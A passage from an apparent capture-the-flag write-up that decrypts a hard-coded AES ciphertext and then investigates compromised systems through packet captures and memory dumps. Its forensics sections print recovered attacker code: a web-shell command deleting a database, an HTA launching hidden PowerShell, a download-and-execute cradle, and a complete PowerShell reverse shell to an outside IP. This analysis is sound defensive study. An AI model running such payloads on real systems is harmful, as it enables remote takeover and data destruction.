    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">ctx</span> <span class="o">=</span> <span class="n">EVP_CIPHER_CTX_new</span><span class="p">()))</span>
        <span class="n">handleErrors</span><span class="p">();</span>

    <span class="cm">/*
     * Initialise the decryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */</span>
    <span class="k">if</span><span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="n">EVP_DecryptInit_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">EVP_aes_256_cbc</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">))</span>
        <span class="n">handleErrors</span><span class="p">();</span>

    <span class="cm">/*
     * Provide the message to be decrypted, and obtain the plaintext output.
     * EVP_DecryptUpdate can be called multiple times if necessary.
     */</span>
    <span class="k">if</span><span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="n">EVP_DecryptUpdate</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">plaintext</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">,</span> <span class="n">ciphertext_len</span><span class="p">))</span>
        <span class="n">handleErrors</span><span class="p">();</span>
        
    <span class="n">plaintext_len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>

    <span class="cm">/*
     * Finalise the decryption. Further plaintext bytes may be written at
     * this stage.
     */</span>
    <span class="k">if</span><span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="n">EVP_DecryptFinal_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">plaintext</span> <span class="o">+</span> <span class="n">len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">))</span>
        <span class="n">handleErrors</span><span class="p">();</span>
    <span class="n">plaintext_len</span> <span class="o">+=</span> <span class="n">len</span><span class="p">;</span>

    <span class="cm">/* Clean up */</span>
    <span class="n">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">plaintext_len</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="cm">/* A 256 bit key */</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="s">"</span><span class="se">\x99\x82\x56\x34\xc4\xa9\x6c\x53\x4f\xf6\x78\x93\x4d\x9c\x2a\xd7\xde\x2e\x9b\xfb\x1b\xc3\x9c</span><span class="s">\x0</span><span class="se">\xbc\xf9\x2d\x65\x82\x2e\xe4\x45</span><span class="s">"</span><span class="p">;</span>

    <span class="cm">/* A 128 bit IV */</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">iv</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="s">"</span><span class="se">\x6b\xd5\x52\x77\x6f</span><span class="s">\x6</span><span class="se">\x81\xf3\x95\xb3</span><span class="s">\x4</span><span class="se">\xfd\xe5\x84\x23\xfe</span><span class="s">"</span><span class="p">;</span>
    
    <span class="cm">/* From output.txt */</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">ciphertext</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xff\x25\xb1\xd7\xad\xe8\xcd\x36\xbd\x7d\x09\xa6\x1f\xf9\xc1\xc1\xad\x38\xce\x29\x3d\x84\xcb\xe5\x83\x9f\xb6\x61\xbe\xb7\xea\x4f\x76\x5d\x2d\xc4\x4e\x2d\xa6\x70\xdc\x04\xe3\xe6\xbb\xc1\x85\x21</span><span class="s">"</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">ciphertext_len</span> <span class="o">=</span> <span class="mi">48</span><span class="p">;</span>

    <span class="cm">/* Buffer for the decrypted text */</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">decryptedtext</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>

    <span class="kt">int</span> <span class="n">decryptedtext_len</span><span class="p">;</span>

    <span class="cm">/* Decrypt the ciphertext */</span>
    <span class="n">decryptedtext_len</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">ciphertext_len</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span>
                                <span class="n">decryptedtext</span><span class="p">);</span>

    <span class="cm">/* Add a NULL terminator. We are expecting printable text */</span>
    <span class="n">decryptedtext</span><span class="p">[</span><span class="n">decryptedtext_len</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>

    <span class="cm">/* Show the decrypted text */</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">decryptedtext</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span> 
</pre></table></code></div></div><p>Compiling it and executing the program, we get the flag.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>gcc upgraded.c <span class="nt">-lcrypto</span> <span class="nt">-lssl</span>

<span class="nv">$ </span>./a.out
HTB<span class="o">{</span>h4rdc0d1ng_k3ys?r00k13_m15t4k3!<span class="o">}</span>
</pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{h4rdc0d1ng_k3ys?r00k13_m15t4k3!}</code></p><h1 id="forensics">Forensics</h1><h2 id="baby-apt-day-1">baby APT (Day 1)</h2><blockquote><p>This is the most wonderful time of the year, but not for Santa’s incident response team. Since Santa went digital, everyone can write a letter to him using his brand new website. Apparently an APT group hacked their way in to Santa’s server and destroyed his present list. Could you investigate what happened?<br /> Downloadedable content: <code class="language-plaintext highlighter-rouge">rev_infiltration.zip</code></p></blockquote><p>Inside of <code class="language-plaintext highlighter-rouge">rev_infiltration.zip</code> was a PCAP file <code class="language-plaintext highlighter-rouge">christmaswishlist.pcap</code>.</p><p>Since the description talked about hacking into Santa’s website, we can focus on HTTP traffic by using the <code class="language-plaintext highlighter-rouge">http</code> filter.</p><p>Following the traffic by right-clicking on any of the HTTP packets and going <code class="language-plaintext highlighter-rouge">Follow &gt; HTTP Stream</code>, we can view the full HTTP interaction. Inside one of the streams, we observe that there was a response to <code class="language-plaintext highlighter-rouge">/bg.php</code> that had the title <code class="language-plaintext highlighter-rouge">Web Shell</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta5.png" alt="" /></p><p>From this, we can probably guess that the APT group had managed to upload a web shell (<code class="language-plaintext highlighter-rouge">/bg.php</code>) and are using it to execute arbitrary commands. We can then go ahead and look for requests to <code class="language-plaintext highlighter-rouge">/bg.php</code> by using <code class="language-plaintext highlighter-rouge">http.request.uri == "/bg.php"</code> as our filter.</p><p>Among the requests that are used to execute commands using the web shell, there was one that had a long weird command:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">rm</span>  /var/www/html/sites/default/files/.ht.sqlite <span class="o">&amp;&amp;</span> <span class="nb">echo </span>SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59 <span class="o">&gt;</span> /dev/null 2&gt;&amp;1 <span class="o">&amp;&amp;</span> <span class="nb">ls</span> <span class="nt">-al</span>  /var/www/html/sites/default/files
</pre></table></code></div></div><p>In the second part of these chained commands was a base64-encoded string that is echoed to <code class="language-plaintext highlighter-rouge">/dev/null</code>. Decoding it, we get the flag.</p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{0k_n0w_3v3ry0n3_h4s_t0_dr0p_0ff_th3ir_l3tt3rs_4t_th3_p0st_0ff1c3_4g41n}</code></p><h2 id="honeypot-day-2">Honeypot (Day 2)</h2><blockquote><p>Santa really encourages people to be at his good list but sometimes he is a bit naughty himself. He is using a Windows 7 honeypot to capture any suspicious action. Since he is not a forensics expert, can you help him identify any indications of compromise?</p><ol><li>Find the full URL used to download the malware.<li>Find the malicious’s process ID.<li>Find the attackers IP</ol><p>Flag Format: HTB{echo -n “http://url.com/path.foo_PID_127.0.0.1” | md5sum}<br /> Download Link: http://46.101.25.140/forensics_honeypot.zip</p></blockquote><p>Inside of <code class="language-plaintext highlighter-rouge">forensics_honeypot.zip</code> was a file <code class="language-plaintext highlighter-rouge">honeypot.raw</code>. The extension <code class="language-plaintext highlighter-rouge">.raw</code> is usually a tell-tale sign that it was a memory dump, therefore we can use <code class="language-plaintext highlighter-rouge">Volatility</code> to aid us in breaking it down. I will be using <a href="https://github.com/volatilityfoundation/volatility"><code class="language-plaintext highlighter-rouge">Volatility 2</code></a>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>git clone https://github.com/volatilityfoundation/volatility
</pre></table></code></div></div><p>The first time was knowing what profile to use with this memory dump, which we can use the <code class="language-plaintext highlighter-rouge">imageinfo</code> to help us figure it out.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python volatility/vol.py <span class="nt">-f</span> honeypot.raw imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile<span class="o">(</span>s<span class="o">)</span> : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
                     AS Layer1 : IA32PagedMemoryPae <span class="o">(</span>Kernel AS<span class="o">)</span>
                     AS Layer2 : FileAddressSpace <span class="o">(</span>/home/kali/Downloads/honeypot.raw<span class="o">)</span>
                      PAE <span class="nb">type</span> : PAE
                           DTB : 0x185000L
                          KDBG : 0x82930c68L
          Number of Processors : 1
     Image Type <span class="o">(</span>Service Pack<span class="o">)</span> : 1
                KPCR <span class="k">for </span>CPU 0 : 0x82931d00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image <span class="nb">date </span>and <span class="nb">time</span> : 2021-11-25 19:14:12 UTC+0000
     Image <span class="nb">local date </span>and <span class="nb">time</span> : 2021-11-25 11:14:12 <span class="nt">-0800</span>
</pre></table></code></div></div><p>Knowing that we can use the <code class="language-plaintext highlighter-rouge">Win7SP1x86</code> profile, we can now go ahead and run other commands to retrieve more information from the memory dump. Since the description of the challenge talked about a URL, we can first check the browser history by running <code class="language-plaintext highlighter-rouge">iehistory</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python volatility/vol.py <span class="nt">-f</span> honeypot.raw <span class="nt">--profile</span><span class="o">=</span>Win7SP1x86 iehistory
Volatility Foundation Volatility Framework 2.6.
...
<span class="k">**************************************************</span>
Process: 3324 iexplore.exe
Cache <span class="nb">type</span> <span class="s2">"URL "</span> at 0xe95280
Record length: 0x100
Location: Visited: Santa@https://windowsliveupdater.com/christmas_update.hta
Last modified: 2021-11-25 19:13:50 UTC+0000
Last accessed: 2021-11-25 19:13:50 UTC+0000
File Offset: 0x100, Data Offset: 0x0, Data Length: 0xac
<span class="k">**************************************************</span>
Process: 3324 iexplore.exe
Cache <span class="nb">type</span> <span class="s2">"URL "</span> at 0xe95380
Record length: 0x100
Location: Visited: Santa@https://windowsliveupdater.com/christmas_update.hta
Last modified: 2021-11-25 19:13:50 UTC+0000
Last accessed: 2021-11-25 19:13:50 UTC+0000
File Offset: 0x100, Data Offset: 0x0, Data Length: 0xac
<span class="k">**************************************************</span>
...
</pre></table></code></div></div><p>In the list of URLs was this URL <code class="language-plaintext highlighter-rouge">https://windowsliveupdater.com/christmas_update.hta</code> that appeared multiple times and seemed quite suspicious. From the domain, it might seem that it belongs to Microsoft, but actually it wasn’t! Another thing to note was that <code class="language-plaintext highlighter-rouge">.hta</code> files could be used to execute malicious actions on the system that downloaded them by embedding <code class="language-plaintext highlighter-rouge">Powershell</code> commands.</p><p>Just for demonstration purposes, I browsed to <code class="language-plaintext highlighter-rouge">https://windowsliveupdater.com/christmas_update.hta</code> and was redirected to <code class="language-plaintext highlighter-rouge">http://makelaris.com</code>, and then to the <code class="language-plaintext highlighter-rouge">Rick Astley - Never Gonna Give You Up (Official Music Video)</code> youtube link. The attackers probably shut down their distribution link so that no one could investigate them further.</p><p>Even though the link was no longer available, we could still perform a memory dump of the <code class="language-plaintext highlighter-rouge">iexplorer.exe</code> process using process ID <code class="language-plaintext highlighter-rouge">3344</code> and attempt to retrieve the <code class="language-plaintext highlighter-rouge">christmas_update.hta</code> file from it.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python volatility/vol.py <span class="nt">-f</span> honeypot.raw <span class="nt">--profile</span><span class="o">=</span>Win7SP1x86 memdump <span class="nt">-p</span> 3324 <span class="nt">-D</span> dump/
</pre></table></code></div></div><p>After dumping the memory of this process, we could go ahead and run <code class="language-plaintext highlighter-rouge">strings</code> on it to see if we can find anything interesting. I am also going to go ahead and search for any <code class="language-plaintext highlighter-rouge">powershell.exe</code> commands in it.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="nv">$ </span>strings dump/3324.dmp | less
...
0HTTP/1.1 200 OK
Date: Thu, 25 Nov 2021 19:13:42 GMT
Content-Type: application/octet-stream
Content-Length: 464
Connection: keep-alive
last-modified: Thu, 25 Nov 2021 18:50:07 GMT
etag: <span class="s2">"619fdadf-1d0"</span>
accept-ranges: bytes
CF-Cache-Status: DYNAMIC
Expect-CT: max-age<span class="o">=</span>604800, report-uri<span class="o">=</span><span class="s2">"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"</span>
Report-To: <span class="o">{</span><span class="s2">"endpoints"</span>:[<span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"https:</span><span class="se">\/\/</span><span class="s2">a.nel.cloudflare.com</span><span class="se">\/</span><span class="s2">report</span><span class="se">\/</span><span class="s2">v3?s=iXHwVO9Wx9ygWmnqb9ukDTEDc0oaRFSvHQplKsnBPyKs8z697oG11PX%2BWJcTFM1ImBS%2FA7
nhGNEeTK8kyvq7FZai0R46D7ThMX3MBJDlrzr68KaKGvEaM7P8zk2xHlXPFp1V5CDeG7mp"</span><span class="o">}]</span>,<span class="s2">"group"</span>:<span class="s2">"cf-nel"</span>,<span class="s2">"max_age"</span>:604800<span class="o">}</span>
NEL: <span class="o">{</span><span class="s2">"success_fraction"</span>:0,<span class="s2">"report_to"</span>:<span class="s2">"cf-nel"</span>,<span class="s2">"max_age"</span>:604800<span class="o">}</span>
Server: cloudflare
CF-RAY: 6b3d32208d8338cc-ATH
alt-svc: <span class="nv">h3</span><span class="o">=</span><span class="s2">":443"</span><span class="p">;</span> <span class="nv">ma</span><span class="o">=</span>86400, h3-29<span class="o">=</span><span class="s2">":443"</span><span class="p">;</span> <span class="nv">ma</span><span class="o">=</span>86400, h3-28<span class="o">=</span><span class="s2">":443"</span><span class="p">;</span> <span class="nv">ma</span><span class="o">=</span>86400, h3-27<span class="o">=</span><span class="s2">":443"</span><span class="p">;</span> <span class="nv">ma</span><span class="o">=</span>86400
&lt;html&gt;
&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;HTA:APPLICATION <span class="nb">id</span><span class="o">=</span><span class="s2">"Microsoft"</span> <span class="nv">applicationName</span><span class="o">=</span><span class="s2">"Christmas update"</span>/&gt;
&lt;script&gt;
var sh <span class="o">=</span> new ActiveXObject<span class="o">(</span><span class="s2">"WScript.Shell"</span><span class="o">)</span><span class="p">;</span>
sh.run<span class="o">(</span><span class="s1">'powershell.exe /window hidden /e aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHcAaQBuAGQAbwB3AHMAbABpAHYAZQB1AHAAZABhAHQAZQByAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQApAA=='</span><span class="o">)</span><span class="p">;</span>
window.close<span class="o">()</span><span class="p">;</span>
&lt;/script&gt;
&lt;/html&gt;
...
</pre></table></code></div></div><p>Here, we see a <code class="language-plaintext highlighter-rouge">powershell.exe</code> command being executed with a base64-encoded string. If we decode it, we get:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHcAaQBuAGQAbwB3AHMAbABpAHYAZQB1AHAAZABhAHQAZQByAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQApAA=="</span> | <span class="nb">base64</span> <span class="nt">-d</span> 
iex <span class="o">((</span>new-object net.webclient<span class="o">)</span>.downloadstring<span class="o">(</span><span class="s1">'https://windowsliveupdater.com/update.ps1'</span><span class="o">))</span>
</pre></table></code></div></div><p>We see that it downloads a powershell script from <code class="language-plaintext highlighter-rouge">https://windowsliveupdater.com/update.ps1</code> and executes it.</p><p>If we run <code class="language-plaintext highlighter-rouge">pstree</code>, we see a <code class="language-plaintext highlighter-rouge">powershell.exe</code> process running and had spawned 2 additional processes <code class="language-plaintext highlighter-rouge">whoami.exe</code> and <code class="language-plaintext highlighter-rouge">hostname.exe</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python volatility/vol.py <span class="nt">-f</span> honeypot.raw <span class="nt">--profile</span><span class="o">=</span>Win7SP1x86 pstree
Volatility Foundation Volatility Framework 2.6.1
Name                                Pid   PPid   Thds   Hnds Time
<span class="nt">--------------------------------</span> <span class="nt">------</span> <span class="nt">------</span> <span class="nt">------</span> <span class="nt">------</span> <span class="nt">----</span>
...
 0x8420dd28:powershell.exe         2700   3720     13    444 2021-11-25 19:13:50 UTC+0000
<span class="nb">.</span> 0x85d8db00:whoami.exe            4028   2700      0 <span class="nt">------</span> 2021-11-25 19:14:01 UTC+0000
<span class="nb">.</span> 0x84289030:HOSTNAME.EXE          4036   2700      0 <span class="nt">------</span> 2021-11-25 19:14:01 UTC+0000
...
</pre></table></code></div></div><p>It is common for attackers to execute <code class="language-plaintext highlighter-rouge">whoami.exe</code> to understand what user they are running as on the compromised system and <code class="language-plaintext highlighter-rouge">hostname.exe</code> to have an understand which system they have compromised. Therefore, we can confidentantly say that this <code class="language-plaintext highlighter-rouge">powershell.exe</code> was the malicious process.</p><p>Since <code class="language-plaintext highlighter-rouge">powershell.exe</code> was executing <code class="language-plaintext highlighter-rouge">update.ps1</code>, it probably still has the contents in its memory so lets dump out its memory.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python volatility/vol.py <span class="nt">-f</span> honeypot.raw <span class="nt">--profile</span><span class="o">=</span>Win7SP1x86 memdump <span class="nt">-p</span> 2700 <span class="nt">-D</span> dump/
</pre></table></code></div></div><p>Lets run <code class="language-plaintext highlighter-rouge">strings</code> to find anything about <code class="language-plaintext highlighter-rouge">update.ps1</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="nv">$ </span>strings dump/2700.dmp | less
...
GET /update.ps1 HTTP/1.1
Host: windowsliveupdater.com
Connection: Keep-Alive
...
<span class="sb">`</span>HTTP/1.1 200 OK
Date: Thu, 25 Nov 2021 19:13:46 GMT
Content-Type: application/octet-stream
Content-Length: 505
Connection: keep-alive
last-modified: Thu, 25 Nov 2021 18:39:35 GMT
etag: <span class="s2">"619fd867-1f9"</span>
accept-ranges: bytes
CF-Cache-Status: DYNAMIC
Expect-CT: max-age<span class="o">=</span>604800, report-uri<span class="o">=</span><span class="s2">"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"</span>
Report-To: <span class="o">{</span><span class="s2">"endpoints"</span>:[<span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"https:</span><span class="se">\/\/</span><span class="s2">a.nel.cloudflare.com</span><span class="se">\/</span><span class="s2">report</span><span class="se">\/</span><span class="s2">v3?s=lgmogUDZhWNbaKDp9khWTT01tuMkibt7NKtJIq83%2BoppMmkhAi7AVQroff%2FhACgijFiykEluctNJ4GFZRCeDCgpNf42eYRQ5su8vSZnWUQEjYJFUpLo7ImRWXpqxXjkzPHrHx6XKl%2BUD"</span><span class="o">}]</span>,<span class="s2">"group"</span>:<span class="s2">"cf-nel"</span>,<span class="s2">"max_age"</span>:604800<span class="o">}</span>
NEL: <span class="o">{</span><span class="s2">"success_fraction"</span>:0,<span class="s2">"report_to"</span>:<span class="s2">"cf-nel"</span>,<span class="s2">"max_age"</span>:604800<span class="o">}</span>
Server: cloudflare
CF-RAY: 6b3d3239c9006f73-ATH
alt-svc: <span class="nv">h3</span><span class="o">=</span><span class="s2">":443"</span><span class="p">;</span> <span class="nv">ma</span><span class="o">=</span>86400, h3-29<span class="o">=</span><span class="s2">":443"</span><span class="p">;</span> <span class="nv">ma</span><span class="o">=</span>86400, h3-28<span class="o">=</span><span class="s2">":443"</span><span class="p">;</span> <span class="nv">ma</span><span class="o">=</span>86400, h3-27<span class="o">=</span><span class="s2">":443"</span><span class="p">;</span> <span class="nv">ma</span><span class="o">=</span>86400
<span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">'147.182.172.189'</span>,4444<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte[]]<span class="nv">$bytes</span> <span class="o">=</span> 0..65535|%<span class="o">{</span>0<span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, 0, <span class="nv">$bytes</span>.Length<span class="o">))</span> <span class="nt">-ne</span> 0<span class="o">){</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object <span class="nt">-TypeName</span> System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> 2&gt;&amp;1 | Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span> <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s1">'PS '</span> + <span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path + <span class="s1">'&gt; '</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding]::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>
...
</pre></table></code></div></div><p>We managed to find the HTTP request in its memory and further down, we see the response to this HTTP request and the contents of <code class="language-plaintext highlighter-rouge">update.ps1</code>. Immediately, we can spot the code for establishing a TCP connection to <code class="language-plaintext highlighter-rouge">147.182.172.189</code> at port <code class="language-plaintext highlighter-rouge">4444</code>.</p><p>With the things we found,</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Full URL used to download the malware: https://windowsliveupdater.com/christmas_update.hta
Malicious's process ID: 2700 (Process ID of the malicious powershell.exe)
Attackers IP: 147.182.172.189
</pre></table></code></div></div><p>We can go ahead and generate the flag:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"https://windowsliveupdater.com/christmas_update.hta_2700_147.182.172.189"</span> | <span class="nb">md5sum
</span>969b934d7396d043a50a37b70e1e010a  -
</pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{969b934d7396d043a50a37b70e1e010a}</code></p><h2 id="persist-day-3">Persist (Day 3)</h2><blockquote><p>Although Santa just updated his infra, problems still occur. He keeps complaining about slow boot time and a blue window popping up for a split second during startup. The IT elves support suggested that he should restart his computer. Ah, classic IT support!<br /> Download Link: <code class="language-plaintext highlighter-rouge">http://46.101.25.140/forensics_persist.zip</code></p></blockquote><p>Inside of <code class="language-plaintext highlighter-rouge">forensics_persist.zip</code> was a memory dump <code class="language-plaintext highlighter-rouge">persist.raw</code>.</p><p>Lets check out what profile we can use to analyse it.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python volatility/vol.py <span class="nt">-f</span> persist.raw imageinfo 
Volatility Foundation Volatility Framework 2.6.1
...
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile<span class="o">(</span>s<span class="o">)</span> : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
                     AS Layer1 : IA32PagedMemoryPae <span class="o">(</span>Kernel AS<span class="o">)</span>
                     AS Layer2 : FileAddressSpace <span class="o">(</span>/home/kali/Downloads/persist.raw<span class="o">)</span>
                      PAE <span class="nb">type</span> : PAE
                           DTB : 0x185000L
                          KDBG : 0x82977c68L
          Number of Processors : 1
     Image Type <span class="o">(</span>Service Pack<span class="o">)</span> : 1
                KPCR <span class="k">for </span>CPU 0 : 0x82978d00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image <span class="nb">date </span>and <span class="nb">time</span> : 2021-11-30 22:05:35 UTC+0000
     Image <span class="nb">local date </span>and <span class="nb">time</span> : 2021-11-30 14:05:35 <span class="nt">-0800</span>
</pre></table></code></div></div><p>In the description, there was mentions of a window popping up during startup, so perhaps we will need to investigate what autoruns are there. Fortunately we can use the <a href="https://github.com/tomchop/volatility-autoruns"><code class="language-plaintext highlighter-rouge">volatility-autoruns</code></a> plugin to ease our job.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>git clone https://github.com/tomchop/volatility-autoruns
</pre></table></code></div></div><p>We then use the plugin on the memory dump to do any autorun information.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python volatility/vol.py <span class="nt">--plugins</span><span class="o">=</span>volatility-autoruns/ <span class="nt">-f</span> persist.raw <span class="nt">--profile</span><span class="o">=</span>Win7SP1x86 autoruns <span class="nt">--asep-type</span><span class="o">=</span>autoruns
Volatility Foundation Volatility Framework 2.6.1
...
Hive: <span class="se">\?</span>?<span class="se">\C</span>:<span class="se">\U</span>sers<span class="se">\S</span>anta<span class="se">\n</span>tuser.dat 
